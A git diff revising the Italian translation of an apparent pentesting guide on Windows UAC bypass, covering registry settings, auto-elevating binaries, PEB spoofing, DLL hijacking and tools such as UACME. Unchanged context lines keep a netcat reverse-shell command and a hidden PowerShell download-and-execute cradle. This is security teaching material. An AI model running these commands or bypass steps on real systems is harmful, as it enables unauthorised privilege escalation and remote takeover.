@@ -4,7 +4,7 @@
 
 ## UAC
 
-[Il Controllo Account Utente (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) è una funzionalità che abilita un **messaggio di consenso per attività elevate**. Le applicazioni hanno diversi livelli di `integrità`, e un programma con un **alto livello** può eseguire compiti che **potrebbero compromettere il sistema**. Quando UAC è abilitato, le applicazioni e i compiti vengono sempre **eseguiti sotto il contesto di sicurezza di un account non amministratore** a meno che un amministratore non autorizzi esplicitamente queste applicazioni/compiti ad avere accesso di livello amministratore al sistema per essere eseguiti. È una funzionalità di comodità che protegge gli amministratori da modifiche non intenzionali ma non è considerata un confine di sicurezza.
+[Il Controllo Account Utente (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) è una funzionalità che abilita un **messaggio di consenso per attività elevate**. Le applicazioni hanno diversi livelli di `integrità`, e un programma con un **alto livello** può eseguire compiti che **potrebbero compromettere il sistema**. Quando l'UAC è abilitato, le applicazioni e i compiti vengono sempre **eseguiti sotto il contesto di sicurezza di un account non amministratore** a meno che un amministratore non autorizzi esplicitamente queste applicazioni/compiti ad avere accesso di livello amministrativo al sistema per essere eseguiti. È una funzionalità di comodità che protegge gli amministratori da modifiche non intenzionali, ma non è considerata un confine di sicurezza.
 
 Per ulteriori informazioni sui livelli di integrità:
 
@@ -12,34 +12,40 @@ Per ulteriori informazioni sui livelli di integrità:
 ../windows-local-privilege-escalation/integrity-levels.md
 {{#endref}}
 
-Quando UAC è attivo, a un utente amministratore vengono forniti 2 token: una chiave per utente standard, per eseguire azioni regolari a livello normale, e una con i privilegi di amministratore.
+Quando l'UAC è attivo, a un utente amministratore vengono forniti 2 token: una chiave per utente standard, per eseguire azioni regolari a livello normale, e una con i privilegi di amministratore.
 
-Questa [pagina](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) discute in dettaglio come funziona UAC e include il processo di accesso, l'esperienza utente e l'architettura UAC. Gli amministratori possono utilizzare le politiche di sicurezza per configurare come funziona UAC specificamente per la loro organizzazione a livello locale (utilizzando secpol.msc), o configurato e distribuito tramite Oggetti Criteri di Gruppo (GPO) in un ambiente di dominio Active Directory. Le varie impostazioni sono discusse in dettaglio [qui](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Ci sono 10 impostazioni di Criteri di Gruppo che possono essere impostate per UAC. La seguente tabella fornisce ulteriori dettagli:
+Questa [pagina](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) discute in dettaglio come funziona l'UAC e include il processo di accesso, l'esperienza utente e l'architettura dell'UAC. Gli amministratori possono utilizzare le politiche di sicurezza per configurare come funziona l'UAC specifico per la loro organizzazione a livello locale (utilizzando secpol.msc), o configurato e distribuito tramite Oggetti Criteri di Gruppo (GPO) in un ambiente di dominio Active Directory. Le varie impostazioni sono discusse in dettaglio [qui](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Ci sono 10 impostazioni di Criteri di Gruppo che possono essere impostate per l'UAC. La seguente tabella fornisce ulteriori dettagli:
 
-| Impostazione Criteri di Gruppo                                                                                                                                                                                                                                                                                                                                                           | Chiave di Registro                | Impostazione Predefinita                                              |
+| Impostazione Criteri di Gruppo                                                                                                                                                                                                                                                                                                                                                           | Chiave di Registro          | Impostazione Predefinita                                      |
 | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
-| [Controllo Account Utente: Modalità di Approvazione Amministrativa per l'account Amministratore integrato](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Disabilitato                                                     |
-| [Controllo Account Utente: Consenti alle applicazioni UIAccess di richiedere elevazione senza utilizzare il desktop sicuro](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Disabilitato                                                     |
+| [Controllo Account Utente: Modalità di Approvazione Amministrativa per l'account Amministratore integrato](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Disabilitato                                                 |
+| [Controllo Account Utente: Consenti alle applicazioni UIAccess di richiedere elevazione senza utilizzare il desktop sicuro](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Disabilitato                                                 |
 | [Controllo Account Utente: Comportamento del messaggio di elevazione per gli amministratori in Modalità di Approvazione Amministrativa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Richiesta di consenso per binari non Windows                  |
 | [Controllo Account Utente: Comportamento del messaggio di elevazione per utenti standard](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Richiesta di credenziali sul desktop sicuro                 |
 | [Controllo Account Utente: Rileva installazioni di applicazioni e richiedi elevazione](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Abilitato (predefinito per home) Disabilitato (predefinito per enterprise) |
-| [Controllo Account Utente: Eleva solo eseguibili firmati e convalidati](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Disabilitato                                                     |
-| [Controllo Account Utente: Eleva solo le applicazioni UIAccess installate in posizioni sicure](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Abilitato                                                      |
-| [Controllo Account Utente: Esegui tutti gli amministratori in Modalità di Approvazione Amministrativa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Abilitato                                                      |
-| [Controllo Account Utente: Passa al desktop sicuro quando si richiede elevazione](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Abilitato                                                      |
-| [Controllo Account Utente: Virtualizza i fallimenti di scrittura di file e registro in posizioni per utente](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Abilitato                                                      |
+| [Controllo Account Utente: Eleva solo eseguibili firmati e convalidati](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Disabilitato                                                 |
+| [Controllo Account Utente: Eleva solo le applicazioni UIAccess installate in posizioni sicure](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Abilitato                                                    |
+| [Controllo Account Utente: Esegui tutti gli amministratori in Modalità di Approvazione Amministrativa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Abilitato                                                    |
+| [Controllo Account Utente: Passa al desktop sicuro quando si richiede elevazione](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Abilitato                                                    |
+| [Controllo Account Utente: Virtualizza i fallimenti di scrittura di file e registro in posizioni per utente](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Abilitato                                                    |
 
 ### Teoria del Bypass UAC
 
 Alcuni programmi sono **autoelevati automaticamente** se l'**utente appartiene** al **gruppo amministratore**. Questi binari hanno all'interno dei loro _**Manifesti**_ l'opzione _**autoElevate**_ con valore _**True**_. Il binario deve essere **firmato da Microsoft** anche.
 
-Quindi, per **bypassare** il **UAC** (elevare da **livello** di integrità **medio** a **alto**) alcuni attaccanti utilizzano questo tipo di binari per **eseguire codice arbitrario** perché verrà eseguito da un **processo di alta integrità**.
+Molti processi auto-elevati espongono **funzionalità tramite oggetti COM o server RPC**, che possono essere invocati da processi in esecuzione con integrità media (privilegi a livello utente normale). Si noti che COM (Component Object Model) e RPC (Remote Procedure Call) sono metodi che i programmi Windows utilizzano per comunicare ed eseguire funzioni tra diversi processi. Ad esempio, **`IFileOperation COM object`** è progettato per gestire operazioni sui file (copiare, eliminare, spostare) e può elevare automaticamente i privilegi senza un messaggio.
 
-Puoi **controllare** il _**Manifest**_ di un binario utilizzando lo strumento _**sigcheck.exe**_ di Sysinternals. E puoi **vedere** il **livello di integrità** dei processi utilizzando _Process Explorer_ o _Process Monitor_ (di Sysinternals).
+Si noti che potrebbero essere eseguiti alcuni controlli, come verificare se il processo è stato eseguito dalla **directory System32**, che può essere bypassato ad esempio **iniettando in explorer.exe** o in un altro eseguibile situato in System32.
+
+Un altro modo per bypassare questi controlli è **modificare il PEB**. Ogni processo in Windows ha un Blocco di Ambiente del Processo (PEB), che include dati importanti sul processo, come il suo percorso eseguibile. Modificando il PEB, gli attaccanti possono falsificare (spoof) la posizione del loro processo malevolo, facendolo apparire come se fosse in esecuzione da una directory di fiducia (come system32). Queste informazioni falsificate ingannano l'oggetto COM facendogli auto-elevare i privilegi senza richiedere l'intervento dell'utente.
+
+Quindi, per **bypassare** l'**UAC** (elevare dal **livello** di integrità **medio** a **alto**), alcuni attaccanti utilizzano questo tipo di binari per **eseguire codice arbitrario** perché verrà eseguito da un **processo di alta integrità**.
+
+Puoi **controllare** il _**Manifest**_ di un binario utilizzando lo strumento _**sigcheck.exe**_ di Sysinternals. (`sigcheck.exe -m <file>`) E puoi **vedere** il **livello di integrità** dei processi utilizzando _Process Explorer_ o _Process Monitor_ (di Sysinternals).
 
 ### Controlla UAC
 
-Per confermare se UAC è abilitato, fai:
+Per confermare se l'UAC è abilitato, fai:
 ```
 REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
 
@@ -71,7 +77,7 @@ Se **`0`**(predefinito), l'**account Amministratore integrato può** eseguire co
 #### Riepilogo
 
 - Se `EnableLUA=0` o **non esiste**, **nessun UAC per nessuno**
-- Se `EnableLua=1` e **`LocalAccountTokenFilterPolicy=1`, Nessun UAC per nessuno**
+- Se `EnableLua=1` e **`LocalAccountTokenFilterPolicy=1` , Nessun UAC per nessuno**
 - Se `EnableLua=1` e **`LocalAccountTokenFilterPolicy=0` e `FilterAdministratorToken=0`, Nessun UAC per RID 500 (Amministratore integrato)**
 - Se `EnableLua=1` e **`LocalAccountTokenFilterPolicy=0` e `FilterAdministratorToken=1`, UAC per tutti**
 
@@ -84,7 +90,7 @@ whoami /groups | findstr Level
 ```
 ## UAC bypass
 
-> [!NOTE]
+> [!TIP]
 > Nota che se hai accesso grafico alla vittima, il bypass UAC è semplice poiché puoi semplicemente cliccare su "Sì" quando appare il prompt UAC.
 
 Il bypass UAC è necessario nella seguente situazione: **l'UAC è attivato, il tuo processo sta girando in un contesto di integrità media e il tuo utente appartiene al gruppo degli amministratori**.
@@ -104,9 +110,9 @@ Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10
 - [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
 - [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)
 
-### **Molto** Base "bypass" UAC (accesso completo al file system)
+### **Molto** Base UAC "bypass" (accesso completo al file system)
 
-Se hai una shell con un utente che è all'interno del gruppo Administrators puoi **montare il C$** condiviso tramite SMB (file system) localmente in un nuovo disco e avrai **accesso a tutto all'interno del file system** (anche alla cartella home dell'Amministratore).
+Se hai una shell con un utente che è all'interno del gruppo Amministratori, puoi **montare il C$** condiviso tramite SMB (file system) localmente in un nuovo disco e avrai **accesso a tutto all'interno del file system** (anche alla cartella home dell'Amministratore).
 
 > [!WARNING]
 > **Sembra che questo trucco non funzioni più**
@@ -137,10 +143,10 @@ runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.w
 
 Documentazione e strumento in [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)
 
-### UAC bypass exploits
+### Sfruttamenti del bypass UAC
 
-[**UACME** ](https://github.com/hfiref0x/UACME)che è una **compilazione** di diversi exploit per il bypass del UAC. Nota che dovrai **compilare UACME utilizzando visual studio o msbuild**. La compilazione creerà diversi eseguibili (come `Source\Akagi\outout\x64\Debug\Akagi.exe`), dovrai sapere **quale ti serve.**\
-Dovresti **fare attenzione** perché alcuni bypass potrebbero **richiedere alcuni altri programmi** che **avviseranno** l'**utente** che sta accadendo qualcosa.
+[**UACME** ](https://github.com/hfiref0x/UACME)che è una **compilazione** di diversi sfruttamenti del bypass UAC. Nota che dovrai **compilare UACME utilizzando visual studio o msbuild**. La compilazione creerà diversi eseguibili (come `Source\Akagi\outout\x64\Debug\Akagi.exe`), dovrai sapere **quale ti serve.**\
+Dovresti **fare attenzione** perché alcuni bypass potrebbero **richiedere altri programmi** che **avviseranno** l'**utente** che sta accadendo qualcosa.
 
 UACME ha la **versione di build da cui ogni tecnica ha iniziato a funzionare**. Puoi cercare una tecnica che influisce sulle tue versioni:
 ```
@@ -150,9 +156,9 @@ Major  Minor  Build  Revision
 -----  -----  -----  --------
 10     0      14393  0
 ```
-Also, usando [this](https://en.wikipedia.org/wiki/Windows_10_version_history) pagina ottieni la versione di Windows `1607` dalle versioni di build.
+Also, usando [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page ottieni la versione di Windows `1607` dalle versioni di build.
 
-#### Ulteriori bypass UAC
+#### Maggiori bypass UAC
 
 **Tutte** le tecniche utilizzate qui per bypassare AUC **richiedono** una **shell interattiva completa** con la vittima (una comune shell nc.exe non è sufficiente).
 
@@ -166,7 +172,7 @@ Puoi ottenerla usando una sessione **meterpreter**. Migra a un **processo** che 
 
 Se hai accesso a una **GUI puoi semplicemente accettare il prompt UAC** quando lo ricevi, non hai davvero bisogno di un bypass. Quindi, ottenere accesso a una GUI ti permetterà di bypassare l'UAC.
 
-Inoltre, se ottieni una sessione GUI che qualcuno stava usando (potenzialmente tramite RDP) ci sono **alcuni strumenti che verranno eseguiti come amministratore** da dove potresti **eseguire** un **cmd** ad esempio **come admin** direttamente senza essere nuovamente sollecitato da UAC come [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Questo potrebbe essere un po' più **furtivo**.
+Inoltre, se ottieni una sessione GUI che qualcuno stava usando (potenzialmente tramite RDP) ci sono **alcuni strumenti che verranno eseguiti come amministratore** da cui potresti **eseguire** un **cmd** ad esempio **come admin** direttamente senza essere nuovamente sollecitato da UAC come [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Questo potrebbe essere un po' più **furtivo**.
 
 ### Bypass UAC rumoroso con brute-force
 
@@ -174,14 +180,14 @@ Se non ti importa di essere rumoroso, potresti sempre **eseguire qualcosa come**
 
 ### Il tuo bypass - Metodologia di base per il bypass UAC
 
-Se dai un'occhiata a **UACME** noterai che **la maggior parte dei bypass UAC sfrutta una vulnerabilità di Dll Hijacking** (principalmente scrivendo il dll malevolo su _C:\Windows\System32_). [Leggi questo per imparare come trovare una vulnerabilità di Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).
+Se dai un'occhiata a **UACME** noterai che **la maggior parte dei bypass UAC sfrutta una vulnerabilità di Dll Hijacking** (principalmente scrivendo la dll malevola in _C:\Windows\System32_). [Leggi questo per imparare come trovare una vulnerabilità di Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).
 
 1. Trova un binario che si **autoelevi** (controlla che quando viene eseguito funzioni a un livello di integrità elevato).
 2. Con procmon trova eventi "**NAME NOT FOUND**" che possono essere vulnerabili a **DLL Hijacking**.
-3. Probabilmente dovrai **scrivere** il DLL all'interno di alcuni **percorsi protetti** (come C:\Windows\System32) dove non hai permessi di scrittura. Puoi bypassare questo usando:
+3. Probabilmente dovrai **scrivere** la DLL all'interno di alcuni **percorsi protetti** (come C:\Windows\System32) dove non hai permessi di scrittura. Puoi bypassare questo usando:
    1. **wusa.exe**: Windows 7, 8 e 8.1. Permette di estrarre il contenuto di un file CAB all'interno di percorsi protetti (perché questo strumento viene eseguito da un livello di integrità elevato).
    2. **IFileOperation**: Windows 10.
-4. Prepara uno **script** per copiare il tuo DLL all'interno del percorso protetto ed eseguire il binario vulnerabile e autoelevato.
+4. Prepara uno **script** per copiare la tua DLL all'interno del percorso protetto ed eseguire il binario vulnerabile e autoelevato.
 
 ### Un'altra tecnica di bypass UAC
 
